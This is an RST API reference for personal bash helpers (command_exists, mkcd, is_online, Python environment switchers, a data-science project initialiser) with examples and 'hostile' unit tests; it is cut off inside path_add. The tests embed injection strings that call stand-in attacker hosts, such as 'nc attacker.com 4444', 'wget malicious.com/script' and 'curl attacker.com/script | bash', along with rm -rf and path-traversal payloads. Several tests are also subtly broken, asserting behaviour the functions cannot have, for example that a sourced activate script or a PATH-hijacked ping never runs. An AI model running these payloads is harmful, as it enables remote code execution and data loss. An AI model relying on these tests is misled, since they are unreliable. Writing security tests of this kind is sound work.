Core Functions API Reference
=============================

This section documents all core functions with their definitions, usage examples, and corresponding unit tests.

.. contents:: Functions in this module
   :local:
   :depth: 2

Essential Shell Utilities
--------------------------

command_exists()
~~~~~~~~~~~~~~~~

**Function Definition:**

.. code-block:: bash

   command_exists() {
       # Check if a command exists in the system
       # 
       # Args:
       #     command (str): Name of command to check
       #
       # Returns:
       #     0: Command exists
       #     1: Command not found
       command -v "$1" >/dev/null 2>&1
   }

**Examples and Elaboration:**

The ``command_exists`` function is a fundamental utility that safely checks for command availability without generating error output. This is essential for conditional loading of modules and graceful degradation.

.. code-block:: bash

   # Basic usage - check if a command exists
   if command_exists "docker"; then
       echo "Docker is available"
       load_docker_module
   else
       echo "Docker not found - skipping Docker integration"
   fi

   # Use in conditional statements
   command_exists "python" && echo "Python found" || echo "Python missing"

   # Check multiple commands
   for cmd in "git" "python" "node" "java"; do
       if command_exists "$cmd"; then
           echo "✅ $cmd: Available"
       else
           echo "❌ $cmd: Missing"
       fi
   done

   # Use in function definitions for robust error handling
   setup_development_env() {
       local required_commands=("git" "python" "node")
       for cmd in "${required_commands[@]}"; do
           if ! command_exists "$cmd"; then
               echo "Error: Required command '$cmd' not found"
               return 1
           fi
       done
       echo "All required commands available"
   }

**Unit Tests:**

.. code-block:: bash

   # HOSTILE TEST: Command injection resistance
   test_command_exists_injection_resistance() {
       # Test command injection attempts - should not execute malicious commands
       command_exists "ls; rm -rf /tmp/test_injection" >/dev/null 2>&1
       assert_equals $? 1 "Should reject command injection attempts"
       assert_false "[ -f '/tmp/test_injection_executed' ]" "Should not execute injected commands"

       # Test with command substitution attempts
       command_exists "\$(touch /tmp/command_exists_exploit)" >/dev/null 2>&1
       assert_equals $? 1 "Should reject command substitution attacks"
       assert_false "[ -f '/tmp/command_exists_exploit' ]" "Should not execute command substitution"
   }

   # HOSTILE TEST: Buffer overflow resistance with extremely long input
   test_command_exists_buffer_overflow_resistance() {
       local massive_input=$(printf 'A%.0s' {1..10000})  # 10KB string
       command_exists "$massive_input" >/dev/null 2>&1
       assert_equals $? 1 "Should handle massive input without crashing"

       # Verify function still works after stress test
       command_exists "bash" >/dev/null 2>&1
       assert_equals $? 0 "Function should remain operational after stress test"
   }

   # HOSTILE TEST: Special character and null byte handling
   test_command_exists_malicious_input() {
       # Test null bytes (common injection vector)
       command_exists "ls\x00rm" >/dev/null 2>&1
       assert_equals $? 1 "Should reject null byte injection"

       # Test various special characters that could break parsing
       local malicious_chars=(";" "&" "|" "\"" "'" "\`" "\$" "*" "?" "[" "]")
       for char in "${malicious_chars[@]}"; do
           command_exists "test${char}command" >/dev/null 2>&1
           assert_equals $? 1 "Should reject special character: $char"
       done
   }

   # HOSTILE TEST: Race condition and concurrent access
   test_command_exists_concurrent_stress() {
       # Test concurrent calls to detect race conditions
       local pids=()
       for i in {1..20}; do
           (command_exists "bash" >/dev/null 2>&1; echo $? > "/tmp/result_$i") &
           pids+=($!)
       done

       # Wait for all processes
       for pid in "${pids[@]}"; do
           wait "$pid"
       done

       # Verify all results are consistent
       for i in {1..20}; do
           local result=$(cat "/tmp/result_$i" 2>/dev/null || echo "FAIL")
           assert_equals "$result" "0" "Concurrent call $i should succeed"
           rm -f "/tmp/result_$i"
       done
   }

   # PERFORMANCE TEST: Response time under stress
   test_command_exists_performance_degradation() {
       local start_time=$(date +%s%N)

       # Run 100 iterations to detect performance degradation
       for i in {1..100}; do
           command_exists "bash" >/dev/null 2>&1
       done

       local end_time=$(date +%s%N)
       local duration_ms=$(( (end_time - start_time) / 1000000 ))

       # Should complete 100 iterations in under 1 second (1000ms)
       assert_true "(( duration_ms < 1000 ))" "100 iterations should complete within 1000ms, took ${duration_ms}ms"
   }

mkcd()
~~~~~~

**Function Definition:**

.. code-block:: bash

   mkcd() {
       # Create directory and change into it
       #
       # Args:
       #     directory_path (str): Path to directory to create
       #
       # Returns:
       #     0: Success
       #     1: Failed to create or enter directory
       mkdir -p "$1" && cd "$1"
   }

**Examples and Elaboration:**

The ``mkcd`` function combines the common pattern of creating a directory and immediately entering it. The ``-p`` flag ensures parent directories are created as needed, and the ``&&`` ensures we only change directories if creation succeeds.

.. code-block:: bash

   # Basic usage - create and enter directory
   mkcd "new_project"
   # Creates 'new_project' directory and changes into it

   # Create nested directories
   mkcd "projects/data_science/experiment_1"
   # Creates full path: projects/data_science/experiment_1

   # Use in project setup workflows
   setup_project() {
       local project_name="$1"
       mkcd "$project_name" || {
           echo "Failed to create project directory: $project_name"
           return 1
       }
       
       # Create project structure
       mkdir -p {src,tests,docs,data}
       echo "Project $project_name created successfully"
   }

   # Temporary directory creation
   create_temp_workspace() {
       local temp_dir="/tmp/workspace_$(date +%s)"
       mkcd "$temp_dir"
       echo "Working in temporary directory: $PWD"
   }

   # Error handling example
   mkcd "/root/restricted" || {
       echo "Cannot create directory in restricted location"
       mkcd "$HOME/alternative_location"
   }

**Unit Tests:**

.. code-block:: bash

   # HOSTILE TEST: Path traversal attack resistance
   test_mkcd_path_traversal_attack() {
       local original_dir="$PWD"

       # Test various path traversal attempts
       local attacks=(
           "../../../etc/passwd"
           "/tmp/../../../root/.ssh"
           "../../../../usr/bin/dangerous"
           "\x2e\x2e/\x2e\x2e/sensitive"
       )

       for attack in "${attacks[@]}"; do
           mkcd "$attack" 2>/dev/null || true

           # Should not end up in system directories
           assert_false "[[ '$PWD' =~ '/etc' ]]" "Should not traverse to /etc via: $attack"
           assert_false "[[ '$PWD' =~ '/root' ]]" "Should not traverse to /root via: $attack"
           assert_false "[[ '$PWD' =~ '/usr/bin' ]]" "Should not traverse to /usr/bin via: $attack"

           cd "$original_dir" 2>/dev/null || true
       done
   }

   # HOSTILE TEST: Command injection in directory names
   test_mkcd_command_injection_resistance() {
       local original_dir="$PWD"

       # Test command injection attempts
       local injection_attempts=(
           "test; rm -rf /tmp/injection_test"
           "test\$(touch /tmp/mkcd_exploit)"
           "test\`id > /tmp/mkcd_id\`"
           "test|nc -l 4444"
           "test&wget malicious.com/script"
       )

       for injection in "${injection_attempts[@]}"; do
           mkcd "/tmp/$injection" 2>/dev/null || true

           # Verify no commands were executed
           assert_false "[ -f '/tmp/injection_test' ]" "Should not execute rm command"
           assert_false "[ -f '/tmp/mkcd_exploit' ]" "Should not execute touch via command substitution"
           assert_false "[ -f '/tmp/mkcd_id' ]" "Should not execute id via backticks"

           cd "$original_dir" 2>/dev/null || true
       done
   }

   # HOSTILE TEST: Race condition with concurrent mkcd calls
   test_mkcd_race_condition_resistance() {
       local base_dir="/tmp/mkcd_race_test_$$"
       local pids=()

       # Launch multiple concurrent mkcd operations
       for i in {1..10}; do
           (
               mkcd "$base_dir/dir_$i" 2>/dev/null
               echo "SUCCESS:$i:$PWD" > "/tmp/mkcd_result_$i"
           ) &
           pids+=($!)
       done

       # Wait for all processes
       for pid in "${pids[@]}"; do
           wait "$pid" 2>/dev/null || true
       done

       # Verify all directories were created correctly
       local success_count=0
       for i in {1..10}; do
           if [[ -f "/tmp/mkcd_result_$i" ]]; then
               local result=$(cat "/tmp/mkcd_result_$i")
               if [[ "$result" =~ "SUCCESS:$i:.*dir_$i" ]]; then
                   ((success_count++))
               fi
           fi
           rm -f "/tmp/mkcd_result_$i"
       done

       assert_true "(( success_count >= 8 ))" "At least 8/10 concurrent mkcd operations should succeed (got $success_count)"

       # Cleanup
       rm -rf "$base_dir"
   }

   # HOSTILE TEST: Resource exhaustion resistance
   test_mkcd_resource_exhaustion_resistance() {
       local original_dir="$PWD"
       local temp_base="/tmp/mkcd_stress_$$"

       # Test creating many nested directories rapidly
       local max_depth=50
       local deep_path="$temp_base"

       for i in $(seq 1 $max_depth); do
           deep_path="$deep_path/level_$i"
       done

       # This should work without hanging or crashing
       local start_time=$(date +%s)
       mkcd "$deep_path" 2>/dev/null
       local end_time=$(date +%s)
       local duration=$((end_time - start_time))

       # Should complete within reasonable time (10 seconds)
       assert_true "(( duration < 10 ))" "Deep directory creation should complete quickly (took ${duration}s)"

       # Should be in the correct directory
       assert_true "[[ '$PWD' =~ 'level_50' ]]" "Should successfully navigate to deep directory"

       cd "$original_dir"
       rm -rf "$temp_base"
   }

   # HOSTILE TEST: Filesystem boundary attacks
   test_mkcd_filesystem_boundary_attacks() {
       local original_dir="$PWD"

       # Test various filesystem boundary conditions
       local boundary_tests=(
           "/dev/null/impossible"  # Special file as parent
           "/proc/self/fd/impossible"  # Process filesystem
           ""  # Empty string
           "/tmp/$(printf 'A%.0s' {1..1000})"  # Extremely long path
       )

       for test_path in "${boundary_tests[@]}"; do
           mkcd "$test_path" 2>/dev/null || true

           # Should handle gracefully without crashing
           assert_equals $? 1 "Should fail gracefully on impossible path: $test_path"
           assert_equals "$PWD" "$original_dir" "Should remain in original directory after failed mkcd"
       done
   }

is_online()
~~~~~~~~~~~

**Function Definition:**

.. code-block:: bash

   is_online() {
       # Check if internet connectivity is available
       #
       # Args:
       #     None
       #
       # Returns:
       #     0: Online (internet accessible)
       #     1: Offline (no internet connection)
       ping -c 1 google.com >/dev/null 2>&1
   }

**Examples and Elaboration:**

The ``is_online`` function provides a simple way to check internet connectivity before attempting network operations. It uses a single ping to Google's DNS servers, which is fast and reliable.

.. code-block:: bash

   # Basic connectivity check
   if is_online; then
       echo "Internet connection available"
       # Proceed with network operations
       update_packages
       download_dependencies
   else
       echo "No internet connection - working offline"
       use_cached_data
   fi

   # Use in deployment scripts
   deploy_application() {
       if ! is_online; then
           echo "Error: Internet connection required for deployment"
           return 1
       fi
       
       echo "Downloading latest dependencies..."
       npm install
       echo "Deploying to production..."
   }

   # Conditional package installation
   install_optional_packages() {
       local packages=("docker" "kubernetes-cli" "terraform")
       
       if is_online; then
           for package in "${packages[@]}"; do
               echo "Installing $package..."
               brew install "$package"
           done
       else
           echo "Offline - skipping optional package installation"
       fi
   }

   # Network-dependent configuration
   configure_development_env() {
       if is_online; then
           echo "Configuring for online development"
           export API_ENDPOINT="https://api.production.com"
           download_latest_schema
       else
           echo "Configuring for offline development"  
           export API_ENDPOINT="http://localhost:3000"
           use_local_schema
       fi
   }

**Unit Tests:**

.. code-block:: bash

   # HOSTILE TEST: Network command injection resistance
   test_is_online_injection_resistance() {
       # Override ping to detect injection attempts
       local injection_detected=false
       ping() {
           # Check if any arguments contain injection patterns
           for arg in "$@"; do
               if [[ "$arg" =~ [\;\&\|\$\`] ]]; then
                   injection_detected=true
               fi
           done
           return 1  # Always fail to prevent actual network calls
       }

       # Test the function (should not trigger injection)
       is_online >/dev/null 2>&1

       assert_false "$injection_detected" "is_online should not be vulnerable to command injection"

       # Restore original ping
       unset -f ping
   }

   # HOSTILE TEST: DNS manipulation and timeout resistance
   test_is_online_dns_manipulation_resistance() {
       # Test with various DNS manipulation scenarios
       local timeouts_passed=0

       # Override ping to simulate various DNS attack scenarios
       ping() {
           case "$*" in
               *google.com*)
                   # Simulate slow DNS response (should timeout quickly)
                   sleep 2
                   return 1
                   ;;
               *)
                   return 1
                   ;;
           esac
       }

       local start_time=$(date +%s)
       is_online >/dev/null 2>&1
       local end_time=$(date +%s)
       local duration=$((end_time - start_time))

       # Should timeout quickly even with slow DNS
       assert_true "(( duration <= 3 ))" "Should timeout quickly with slow DNS (took ${duration}s)"

       unset -f ping
   }

   # HOSTILE TEST: Concurrent network check stress
   test_is_online_concurrent_stress() {
       local pids=()
       local start_time=$(date +%s)

       # Override ping to control behavior
       ping() {
           sleep 0.1  # Small delay to test concurrency
           return $(( RANDOM % 2 ))  # Random success/failure
       }

       # Launch many concurrent network checks
       for i in {1..20}; do
           (is_online >/dev/null 2>&1; echo $? > "/tmp/online_result_$i") &
           pids+=($!)
       done

       # Wait for all
       for pid in "${pids[@]}"; do
           wait "$pid" 2>/dev/null || true
       done

       local end_time=$(date +%s)
       local total_duration=$((end_time - start_time))

       # Should handle concurrent calls efficiently
       assert_true "(( total_duration <= 5 ))" "20 concurrent calls should complete within 5s (took ${total_duration}s)"

       # Verify all processes completed
       local completed=0
       for i in {1..20}; do
           if [[ -f "/tmp/online_result_$i" ]]; then
               ((completed++))
               rm -f "/tmp/online_result_$i"
           fi
       done

       assert_true "(( completed >= 18 ))" "At least 18/20 concurrent checks should complete (got $completed)"

       unset -f ping
   }

   # HOSTILE TEST: Resource exhaustion during network operations
   test_is_online_resource_exhaustion() {
       # Test rapid repeated calls to detect resource leaks
       local memory_start=$(ps -o rss= -p $$ 2>/dev/null || echo 0)

       # Override ping for controlled testing
       ping() {
           return 1  # Always fail quickly
       }

       # Make many rapid calls
       for i in {1..100}; do
           is_online >/dev/null 2>&1
       done

       local memory_end=$(ps -o rss= -p $$ 2>/dev/null || echo 0)
       local memory_increase=$((memory_end - memory_start))

       # Should not leak significant memory (allow 1MB increase)
       assert_true "(( memory_increase < 1024 ))" "Should not leak memory during repeated calls (leaked ${memory_increase}KB)"

       unset -f ping
   }

   # HOSTILE TEST: Network interface manipulation resistance
   test_is_online_interface_manipulation() {
       # Test behavior when network interfaces are manipulated
       local original_ping=$(which ping 2>/dev/null || echo "/bin/ping")

       # Create a fake ping that could be used in path manipulation attacks
       mkdir -p "/tmp/fake_bin"
       cat > "/tmp/fake_bin/ping" << 'EOF'
#!/bin/bash
echo "FAKE_PING_EXECUTED" > /tmp/ping_hijack_detected
exit 0
EOF
       chmod +x "/tmp/fake_bin/ping"

       # Temporarily modify PATH to include fake binary first
       export PATH="/tmp/fake_bin:$PATH"

       is_online >/dev/null 2>&1

       # Should not execute fake ping
       assert_false "[ -f '/tmp/ping_hijack_detected' ]" "Should not execute hijacked ping binary"

       # Restore PATH and cleanup
       export PATH="${PATH#/tmp/fake_bin:}"
       rm -rf "/tmp/fake_bin"
       rm -f "/tmp/ping_hijack_detected"
   }

Python Environment Management
-----------------------------

py_env_switch()
~~~~~~~~~~~~~~~

**Function Definition:**

.. code-block:: bash

   py_env_switch() {
       # Quick switch between Python environments (cross-shell compatible)
       #
       # Usage:
       #   py_env_switch list           # List all environments
       #   py_env_switch myenv          # Switch to pyenv environment
       #   py_env_switch uv             # Use UV in current directory
       local target="${1:-list}"
       
       case "$target" in
           "list"|"-l"|"--list")
               echo "🐍 Available Python Environments:"
               echo ""
               echo "📦 Pyenv Environments:"
               if command_exists pyenv; then
                   pyenv versions | sed 's/^/  /'
               else
                   echo "  ❌ Pyenv not installed"
               fi
               echo ""
               echo "⚡ UV Projects:"
               if [[ -f "pyproject.toml" ]]; then
                   echo "  ✅ Current directory has UV project"
               else
                   echo "  ❌ No UV project in current directory"
               fi
               echo ""
               echo "Usage:"
               echo "  py_env_switch <env_name>    # Switch to pyenv environment"
               echo "  py_env_switch uv            # Activate UV project here"
               ;;
           "uv")
               if [[ -f "pyproject.toml" ]]; then
                   if [[ -d ".venv" ]]; then
                       echo "⚡ Activating UV project: $(basename $PWD)"
                       source .venv/bin/activate
                   else
                       echo "🔨 Setting up UV project..."
                       uv sync && source .venv/bin/activate
                   fi
               else
                   echo "❌ No pyproject.toml found. Run 'uv init' to create a UV project."
               fi
               ;;
           *)
               if command_exists pyenv; then
                   echo "🐍 Switching to pyenv environment: $target"
                   pyenv activate "$target" 2>/dev/null || {
                       echo "❌ Environment '$target' not found. Available:"
                       pyenv versions
                   }
               else
                   echo "❌ Pyenv not available"
               fi
               ;;
       esac
   }

**Examples and Elaboration:**

The ``py_env_switch`` function provides unified Python environment management across pyenv and UV, supporting both development workflows seamlessly.

.. code-block:: bash

   # List all available environments
   py_env_switch list
   # Shows both pyenv environments and UV projects

   # Switch to a specific pyenv environment
   py_env_switch data_science
   # Activates the 'data_science' pyenv environment

   # Activate UV project in current directory
   cd my_uv_project
   py_env_switch uv
   # Sets up and activates UV virtual environment

   # Use in project setup scripts
   setup_data_science_project() {
       local project_name="$1"
       local env_type="${2:-uv}"
       
       mkcd "$project_name"
       
       case "$env_type" in
           "uv")
               uv init --name "$project_name" --python 3.11
               uv add pandas numpy matplotlib jupyter
               py_env_switch uv
               ;;
           "pyenv")
               py_env_switch "$project_name" || {
                   echo "Creating new pyenv environment..."
                   pyenv virtualenv 3.11 "$project_name"
                   py_env_switch "$project_name"
               }
               ;;
       esac
   }

   # Environment-specific workflows
   analyze_with_spark() {
       py_env_switch spark_env
       smart_spark_submit analysis.py
   }

   analyze_with_uv() {
       py_env_switch uv
       uv run python analysis.py
   }

**Unit Tests:**

.. code-block:: bash

   # HOSTILE TEST: Python environment injection attacks
   test_py_env_switch_injection_resistance() {
       local injection_attempts=(
           "test_env; rm -rf /tmp/python_injection"
           "env\$(touch /tmp/pyenv_exploit)"
           "env\`id > /tmp/pyenv_id\`"
           "../../../etc/passwd"
           "env|nc attacker.com 4444"
       )

       for injection in "${injection_attempts[@]}"; do
           py_env_switch "$injection" >/dev/null 2>&1

           # Verify no malicious commands were executed
           assert_false "[ -f '/tmp/python_injection' ]" "Should not execute rm via injection: $injection"
           assert_false "[ -f '/tmp/pyenv_exploit' ]" "Should not execute touch via command substitution: $injection"
           assert_false "[ -f '/tmp/pyenv_id' ]" "Should not execute id via backticks: $injection"
       done
   }

   # HOSTILE TEST: UV project file manipulation
   test_py_env_switch_uv_file_manipulation() {
       local test_dir="/tmp/test_uv_hostile_$$"
       mkcd "$test_dir"

       # Create malicious pyproject.toml with potential injection
       cat > pyproject.toml << 'EOF'
[project]
name = "test-project; rm -rf /tmp/uv_attack"
description = "$(touch /tmp/uv_exploit)"
script = "`id > /tmp/uv_id`"
EOF

       # Create fake activation script with malicious content
       mkdir -p .venv/bin
       cat > .venv/bin/activate << 'EOF'
#!/bin/bash
rm -rf /tmp/malicious_cleanup
touch /tmp/venv_hijacked
export VIRTUAL_ENV="HIJACKED"
EOF
       chmod +x .venv/bin/activate

       py_env_switch uv >/dev/null 2>&1

       # Verify malicious content was not executed
       assert_false "[ -f '/tmp/uv_attack' ]" "Should not execute commands from project name"
       assert_false "[ -f '/tmp/uv_exploit' ]" "Should not execute commands from description"
       assert_false "[ -f '/tmp/uv_id' ]" "Should not execute commands from script field"
       assert_false "[ -f '/tmp/malicious_cleanup' ]" "Should not execute malicious activation script"
       assert_false "[ -f '/tmp/venv_hijacked' ]" "Should not allow activation script hijacking"

       # Cleanup
       cd /tmp && rm -rf "$test_dir"
   }

   # HOSTILE TEST: Pyenv environment name manipulation
   test_py_env_switch_pyenv_name_manipulation() {
       # Mock pyenv to test name handling
       pyenv() {
           case "$1" in
               "versions")
                   # Return malicious environment names
                   echo "  system"
                   echo "* test_env; rm -rf /tmp/pyenv_attack"
                   echo "  env\$(touch /tmp/pyenv_exploit)"
                   echo "  env\`id > /tmp/pyenv_id\`"
                   ;;
               "activate")
                   # Should receive properly quoted/escaped arguments
                   if [[ "$2" =~ [\;\$\`\|\&] ]]; then
                       touch "/tmp/pyenv_injection_detected"
                   fi
                   return 1  # Always fail to prevent actual activation
                   ;;
           esac
       }

       # Test listing environments (should handle malicious names safely)
       py_env_switch list >/dev/null 2>&1

       # Test switching to malicious environment name
       py_env_switch "test_env; rm -rf /tmp/pyenv_attack" >/dev/null 2>&1

       # Verify no commands were executed
       assert_false "[ -f '/tmp/pyenv_attack' ]" "Should not execute commands from environment name"
       assert_false "[ -f '/tmp/pyenv_exploit' ]" "Should not execute command substitution from env name"
       assert_false "[ -f '/tmp/pyenv_id' ]" "Should not execute backticks from env name"
       assert_false "[ -f '/tmp/pyenv_injection_detected' ]" "Should properly escape arguments to pyenv"

       unset -f pyenv
   }

   # HOSTILE TEST: Concurrent environment switching race conditions
   test_py_env_switch_race_conditions() {
       local test_base="/tmp/py_race_test_$$"
       mkdir -p "$test_base"
       local pids=()

       # Create multiple UV projects
       for i in {1..5}; do
           local project_dir="$test_base/project_$i"
           mkdir -p "$project_dir/.venv/bin"
           echo '[project]' > "$project_dir/pyproject.toml"
           echo "name = \"project-$i\"" >> "$project_dir/pyproject.toml"
           echo '#!/bin/bash' > "$project_dir/.venv/bin/activate"
           echo "export VIRTUAL_ENV='$project_dir/.venv'" >> "$project_dir/.venv/bin/activate"
           chmod +x "$project_dir/.venv/bin/activate"
       done

       # Launch concurrent environment switches
       for i in {1..5}; do
           (
               cd "$test_base/project_$i"
               py_env_switch uv >/dev/null 2>&1
               echo "$VIRTUAL_ENV" > "/tmp/race_result_$i"
           ) &
           pids+=($!)
       done

       # Wait for all processes
       for pid in "${pids[@]}"; do
           wait "$pid" 2>/dev/null || true
       done

       # Verify each process activated correct environment
       local success_count=0
       for i in {1..5}; do
           if [[ -f "/tmp/race_result_$i" ]]; then
               local result=$(cat "/tmp/race_result_$i")
               if [[ "$result" =~ "project_$i" ]]; then
                   ((success_count++))
               fi
               rm -f "/tmp/race_result_$i"
           fi
       done

       assert_true "(( success_count >= 4 ))" "At least 4/5 concurrent switches should succeed (got $success_count)"

       # Cleanup
       rm -rf "$test_base"
   }

   # HOSTILE TEST: Environment variable pollution resistance
   test_py_env_switch_env_pollution() {
       local original_dir="$PWD"
       local test_dir="/tmp/test_env_pollution_$$"
       mkcd "$test_dir"

       # Pollute environment with malicious variables
       export VIRTUAL_ENV="/malicious/path"
       export PYENV_VERSION="evil_version; rm -rf /tmp/env_attack"
       export PYTHONPATH="/malicious:/paths:$PYTHONPATH"
       export PATH="/fake/python/bin:$PATH"

       # Create legitimate UV project
       echo '[project]' > pyproject.toml
       echo 'name = "clean-project"' >> pyproject.toml
       mkdir -p .venv/bin
       echo '#!/bin/bash' > .venv/bin/activate
       echo "export VIRTUAL_ENV='$test_dir/.venv'" >> .venv/bin/activate
       chmod +x .venv/bin/activate

       py_env_switch uv >/dev/null 2>&1

       # Should properly override polluted environment
       assert_equals "$VIRTUAL_ENV" "$test_dir/.venv" "Should override polluted VIRTUAL_ENV"

       # Verify no malicious commands were executed
       assert_false "[ -f '/tmp/env_attack' ]" "Should not execute commands from polluted PYENV_VERSION"

       cd "$original_dir"
       rm -rf "$test_dir"

       # Restore clean environment
       unset VIRTUAL_ENV PYENV_VERSION
       export PYTHONPATH="${PYTHONPATH#/malicious:/paths:}"
       export PATH="${PATH#/fake/python/bin:}"
   }

ds_project_init()
~~~~~~~~~~~~~~~~~

**Function Definition:**

.. code-block:: bash

   ds_project_init() {
       # Initialize a data science project with UV
       #
       # Usage:
       #   ds_project_init myproject        # Basic data science project
       #   ds_project_init myproject spark  # With Spark dependencies
       local project_name="$1"
       local project_type="${2:-basic}"
       
       if [[ -z "$project_name" ]]; then
           echo "Usage: ds_project_init <project_name> [basic|spark|geo]"
           return 1
       fi
       
       echo "🔬 Creating data science project: $project_name"
       mkdir -p "$project_name" && cd "$project_name"
       
       # Initialize UV project
       uv init --name "$project_name" --python 3.11
       
       # Add common data science dependencies
       echo "📦 Adding data science dependencies..."
       uv add pandas numpy matplotlib seaborn jupyter ipykernel
       
       case "$project_type" in
           "spark")
               echo "⚡ Adding Spark dependencies..."
               uv add pyspark findspark
               ;;
           "geo")
               echo "🌍 Adding geospatial dependencies..."
               uv add geopandas folium contextily
               ;;
       esac
       
       # Create project structure
       mkdir -p {notebooks,data/{raw,processed},src,tests}
       
       echo "✅ Data science project '$project_name' created!"
       echo "🚀 Next steps:"
       echo "  source .venv/bin/activate"
       echo "  jupyter lab"
   }

**Examples and Elaboration:**

The ``ds_project_init`` function creates a complete data science project structure with appropriate dependencies based on the project type.

.. code-block:: bash

   # Create basic data science project
   ds_project_init "sales_analysis"
   # Creates project with pandas, numpy, matplotlib, jupyter

   # Create Spark-enabled data science project
   ds_project_init "big_data_analysis" spark
   # Adds PySpark and Findspark for distributed computing

   # Create geospatial analysis project
   ds_project_init "location_analysis" geo
   # Adds GeoPandas, Folium, Contextily for mapping

   # Use in automated workflows
   create_monthly_analysis() {
       local month=$(date +%Y-%m)
       ds_project_init "analysis_$month" spark
       
       cd "analysis_$month"
       
       # Add custom analysis template
       cat > notebooks/monthly_report.ipynb << 'EOF'
   {
       "cells": [
           {
               "cell_type": "code",
               "source": ["import pandas as pd\nimport pyspark"]
           }
       ]
   }
   EOF
   
       echo "Monthly analysis project ready: analysis_$month"
   }

**Unit Tests:**

.. code-block:: bash

   # HOSTILE TEST: Project name injection and filesystem attacks
   test_ds_project_init_name_injection() {
       local original_dir="$PWD"
       local malicious_names=(
           "project; rm -rf /tmp/ds_attack"
           "../../../etc/malicious_project"
           "project\$(touch /tmp/ds_exploit)"
           "project\`id > /tmp/ds_id\`"
           "project|nc attacker.com 4444"
           "/root/.ssh/unauthorized_project"
       )

       for name in "${malicious_names[@]}"; do
           ds_project_init "$name" >/dev/null 2>&1

           # Verify no malicious commands executed
           assert_false "[ -f '/tmp/ds_attack' ]" "Should not execute rm command from name: $name"
           assert_false "[ -f '/tmp/ds_exploit' ]" "Should not execute touch from name: $name"
           assert_false "[ -f '/tmp/ds_id' ]" "Should not execute id from name: $name"

           # Verify no unauthorized directory creation
           assert_false "[ -d '/etc/malicious_project' ]" "Should not create project in /etc"
           assert_false "[ -d '/root/.ssh/unauthorized_project' ]" "Should not create project in /root/.ssh"
       done

       cd "$original_dir"
   }

   # HOSTILE TEST: Project type manipulation and dependency injection
   test_ds_project_init_type_injection() {
       local original_dir="$PWD"
       local test_project="test_safe_project_$$"

       # Mock uv to detect injection attempts
       local uv_injection_detected=false
       uv() {
           for arg in "$@"; do
               if [[ "$arg" =~ [\;\&\|\$\`] ]]; then
                   uv_injection_detected=true
                   touch "/tmp/uv_injection_detected"
               fi
           done
           return 0  # Mock successful operation
       }

       # Test malicious project types
       local malicious_types=(
           "spark; rm -rf /tmp/type_attack"
           "geo\$(wget malicious.com/script)"
           "basic\`nc -l 4444\`"
           "type|curl attacker.com"
       )

       for type in "${malicious_types[@]}"; do
           ds_project_init "$test_project" "$type" >/dev/null 2>&1

           # Cleanup project if created
           [[ -d "$test_project" ]] && rm -rf "$test_project"
       done

       # Verify no injection occurred
       assert_false "$uv_injection_detected" "Should not inject commands into uv calls"
       assert_false "[ -f '/tmp/uv_injection_detected' ]" "Should not detect uv injection attempts"
       assert_false "[ -f '/tmp/type_attack' ]" "Should not execute commands from project type"

       unset -f uv
       cd "$original_dir"
   }

   # HOSTILE TEST: Concurrent project creation race conditions
   test_ds_project_init_concurrent_creation() {
       local original_dir="$PWD"
       local base_name="race_project_$$"
       local pids=()

       # Mock uv for faster testing
       uv() {
           case "$1" in
               "init") sleep 0.1; return 0 ;;
               "add") sleep 0.1; return 0 ;;
               *) return 0 ;;
           esac
       }

       # Launch concurrent project creation
       for i in {1..10}; do
           (
               ds_project_init "${base_name}_$i" >/dev/null 2>&1
               if [[ -d "${base_name}_$i" ]]; then
                   echo "SUCCESS:$i" > "/tmp/ds_race_result_$i"
               else
                   echo "FAILED:$i" > "/tmp/ds_race_result_$i"
               fi
           ) &
           pids+=($!)
       done

       # Wait for all processes
       for pid in "${pids[@]}"; do
           wait "$pid" 2>/dev/null || true
       done

       # Verify results
       local success_count=0
       for i in {1..10}; do
           if [[ -f "/tmp/ds_race_result_$i" ]]; then
               local result=$(cat "/tmp/ds_race_result_$i")
               if [[ "$result" == "SUCCESS:$i" ]]; then
                   ((success_count++))
               fi
               rm -f "/tmp/ds_race_result_$i"
           fi
           [[ -d "${base_name}_$i" ]] && rm -rf "${base_name}_$i"
       done

       assert_true "(( success_count >= 8 ))" "At least 8/10 concurrent project creations should succeed (got $success_count)"

       unset -f uv
       cd "$original_dir"
   }

   # HOSTILE TEST: Filesystem resource exhaustion during project creation
   test_ds_project_init_resource_exhaustion() {
       local original_dir="$PWD"
       local test_project="resource_test_$$"

       # Create project with extremely nested structure to test limits
       local start_time=$(date +%s)

       # Mock uv to simulate slow operations
       uv() {
           case "$1" in
               "init")
                   sleep 0.5  # Simulate slow initialization
                   return 0
                   ;;
               "add")
                   sleep 0.2  # Simulate slow dependency addition
                   return 0
                   ;;
           esac
       }

       ds_project_init "$test_project" "spark" >/dev/null 2>&1

       local end_time=$(date +%s)
       local duration=$((end_time - start_time))

       # Should complete within reasonable time despite slow operations
       assert_true "(( duration <= 30 ))" "Project creation should complete within 30s (took ${duration}s)"

       # Should create expected structure despite delays
       assert_true "[ -d '$test_project' ]" "Project directory should exist despite slow operations"
       assert_true "[ -d '$test_project/notebooks' ]" "Notebooks directory should exist"
       assert_true "[ -d '$test_project/data/raw' ]" "Data directories should exist"

       # Cleanup
       [[ -d "$test_project" ]] && rm -rf "$test_project"
       unset -f uv
       cd "$original_dir"
   }

   # HOSTILE TEST: Project template manipulation and code injection
   test_ds_project_init_template_manipulation() {
       local original_dir="$PWD"
       local test_project="template_test_$$"

       # Test with environment variables that could affect project templates
       export PROJECT_TEMPLATE_PATH="/malicious/templates"
       export UV_CONFIG_FILE="/tmp/malicious_uv_config"
       export JUPYTER_CONFIG_DIR="/tmp/malicious_jupyter"

       # Create malicious UV config
       mkdir -p "/tmp"
       cat > "/tmp/malicious_uv_config" << 'EOF'
[tool.uv.add]
extra-command = "rm -rf /tmp/template_attack"
post-install = "curl attacker.com/script | bash"
EOF

       ds_project_init "$test_project" >/dev/null 2>&1

       # Verify malicious config was not used
       assert_false "[ -f '/tmp/template_attack' ]" "Should not execute commands from malicious UV config"

       # Cleanup
       [[ -d "$test_project" ]] && rm -rf "$test_project"
       rm -f "/tmp/malicious_uv_config"
       unset PROJECT_TEMPLATE_PATH UV_CONFIG_FILE JUPYTER_CONFIG_DIR
       cd "$original_dir"
   }

Cross-Platform Utilities
-------------------------

path_add()
~~~~~~~~~~

**Function Definition:**

.. code-block:: bash

   path_add() {
       # Cross-platform path addition
       # Usage: path_add /path/to/add [before|after]
       local new_path="$1"
       local position="${2:-after}"
       
       # Check if path exists and is not already in PATH
       if [[ -d "$new_path" ]] && [[ ":$PATH:" != *":$new_path:"* ]]; then
           case "$position" in
               "before")
                   export PATH="$new_path:$PATH"
                   ;;
               "after"|*)
